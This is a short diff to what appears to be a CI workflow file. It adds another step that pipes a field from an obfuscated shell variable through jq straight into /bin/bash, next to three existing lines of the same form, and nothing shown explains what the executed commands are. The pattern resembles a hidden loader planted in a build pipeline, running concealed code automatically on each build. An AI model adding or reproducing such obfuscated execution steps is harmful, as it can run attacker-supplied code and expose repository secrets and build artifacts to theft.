@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$wrh32" | jq -r .kmv113 | /bin/bash
           printf '%s' "$aagvw6" | jq -r .cuv4 | /bin/bash
           printf '%s' "$llj83837" | jq -r .crhxy87 | /bin/bash
+          echo $qerpe1 | jq -r .mkc20981 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
